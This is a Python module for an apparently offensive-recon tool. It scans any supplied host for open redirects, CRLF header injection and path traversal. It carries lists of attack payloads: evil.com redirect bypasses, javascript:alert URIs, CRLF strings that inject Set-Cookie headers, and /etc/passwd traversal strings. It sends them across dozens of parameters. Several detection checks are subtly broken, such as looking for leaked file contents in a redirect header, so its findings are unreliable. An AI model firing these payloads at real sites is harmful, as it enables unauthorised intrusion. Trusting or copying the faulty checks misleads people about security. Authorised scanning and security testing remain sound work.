import httpx
from urllib.parse import urlparse, urlencode, quote
from models import IntelligenceFinding

REDIRECT_PARAMS = [
    "url", "redirect", "return", "next", "target", "dest", "destination",
    "go", "forward", "to", "link", "linkto", "page", "file", "doc",
    "document", "folder", "root", "image", "img", "browse", "load",
    "read", "view", "file_path", "location", "path", "continue",
    "follow", "rurl", "rd", "rdurl", "redir", "redirect_uri",
    "redirect_url", "ReturnUrl", "ReturnPath", "redirect-to",
    "redirectto", "redirect_", "redirectPath", "redirect_path",
    "out", "external", "source", "from", "callback", "cback",
    "ref", "referer", "referrer", "back", "done", "success",
    "failure", "error", "cancel", "cancel_url", "fail",
    "return_url", "return_to", "return-path", "redirectUrl",
    "redirectTo", "next_url", "nextUrl", "next-path", "goto",
    "gourl", "goUrl", "go_to", "rdr", "redir_url", "redirecturl",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/",
    "///evil.com",
    "https://evil.com@good.com",
    "https://evil.com.good.com",
    "https://good.com@evil.com",
    "//good.com@evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",
    "%0d%0aLocation:%20https://evil.com",
    "%0aLocation:%20https://evil.com",
    "/%5cevil.com",
    "/%2eevil%2ecom/",
    "https://evil.com%23.good.com/",
    ".evil.com",
    "@evil.com",
    "../evil.com",
    "/..;/evil.com",
    "\\evil.com",
    "//evil.com:443@good.com",
]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected:%20true",
    "%0aX-Injected:%20true",
    "%0d%0aSet-Cookie:%20test=crlf",
    "%0d%0a%0d%0a<html><script>alert(1)</script></html>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/..%252f..%252f..%252fetc/passwd",
    "/....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

DOMAIN_BYPASS_PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "https://evil.com/?good.com",
    "https://evil.com%23good.com",
    "https://good.com%40evil.com",
    "https://evil.com.good.com",
    "https://evil.com%2egood.com",
    "https://evil.com%2fgood.com",
    "https://good.com.evil.com",
    "https://good.com/..@evil.com",
    "https://good\\.com@evil.com",
    "https://evil.com:443@good.com",
    "https://good.com:443@evil.com",
    "https://evil.com/?dest=good.com",
    "https://good.com%2eevil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://[::1]:443/",
    "https://0x7f000001:443/",
    "https://2130706433:443/",
]

async def test_redirect_param(base_url, param, payload, client):
    test_url = f"{base_url}?{param}={quote(payload)}"
    try:
        resp = await client.get(test_url, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
            follow_redirects=False)
        location = resp.headers.get("location", "")
        if location:
            if "evil.com" in location.lower() or "evil" in location.lower() and param != "redirect":
                return resp.status_code, location, True
            if location.startswith("javascript:") or location.startswith("data:") or location.startswith("vbscript:"):
                return resp.status_code, location, True
            if "alert" in location.lower():
                return resp.status_code, location, True
            if resp.status_code in (301, 302, 303, 307, 308) and "evil" in location.lower():
                return resp.status_code, location, True
        return resp.status_code, location, False
    except Exception:
        return 0, "", False

async def check_redirect_footprint(base_url, client):
    try:
        resp = await client.get(base_url, follow_redirects=False, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0"})
        return resp.status_code, dict(resp.headers)
    except Exception:
        return 0, {}

async def crawl(target: str, client: httpx.AsyncClient):
    findings = []
    base_url = f"https://{target}" if not target.startswith("http") else target
    if base_url.endswith("/"):
        base_url = base_url[:-1]

    try:
        base_status, base_headers = await check_redirect_footprint(base_url, client)
        is_auth_required = base_status in (401, 403, 302) and "login" in base_headers.get("location", "").lower()
        found_vulnerabilities = []

        for param in REDIRECT_PARAMS:
            for payload in DOMAIN_BYPASS_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)
                        severity = "Critical" if is_auth_required else "High Risk"
                        findings.append(IntelligenceFinding(
                            entity=f"Open redirect: ?{param}={payload[:80]} -> {location[:200]}",
                            type="Open Redirect Vulnerability",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level=severity,
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Status: {status} | Location: {location}",
                            tags=["open-redirect", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS:
            for payload in CRLF_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status in (301, 302, 303, 307, 308) and location:
                    check_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        verify = await client.get(check_url, timeout=5.0,
                            headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=False)
                        verify_headers = dict(verify.headers)
                        if "X-Injected" in verify_headers or "Set-Cookie" in verify_headers:
                            findings.append(IntelligenceFinding(
                                entity=f"CRLF injection via ?{param}",
                                type="CRLF Injection (Header Splitting)",
                                source="OpenRedirectScanner",
                                confidence="High",
                                color="red",
                                threat_level="Critical",
                                raw_data=f"URL: {check_url} | Header injection detected in response",
                                tags=["crlf", "header-injection", "vulnerability"]
                            ))
                    except Exception:
                        pass

        for param in REDIRECT_PARAMS:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status == 200 and location:
                    if "root:x" in location or "etc/passwd" in location or "[extensions]" in location:
                        findings.append(IntelligenceFinding(
                            entity=f"Path traversal via ?{param} - file content leaked",
                            type="Path Traversal via Redirect",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level="Critical",
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Content leaked in response",
                            tags=["path-traversal", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS:
            for payload in ["https://evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload[:30]}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)

        if found_vulnerabilities:
            findings.append(IntelligenceFinding(
                entity=f"{len(found_vulnerabilities)} open redirect vectors found",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="High",
                color="red",
                threat_level="Critical" if is_auth_required else "High Risk",
                raw_data="; ".join(found_vulnerabilities[:20]),
                tags=["open-redirect", "summary"]
            ))
        else:
            findings.append(IntelligenceFinding(
                entity=f"No open redirect found on {len(REDIRECT_PARAMS)} parameters tested",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="Medium",
                color="emerald",
                threat_level="Informational",
                raw_data=f"Tested {len(REDIRECT_PARAMS)} parameters with {len(DOMAIN_BYPASS_PAYLOADS)} payloads each",
                tags=["open-redirect", "summary"]
            ))

    except Exception as e:
        findings.append(IntelligenceFinding(
            entity=f"Open Redirect error: {str(e)[:100]}",
            type="Open Redirect Error",
            source="OpenRedirectScanner",
            confidence="Low",
            color="red",
            threat_level="Informational",
            tags=["error"]
        ))

    return findings
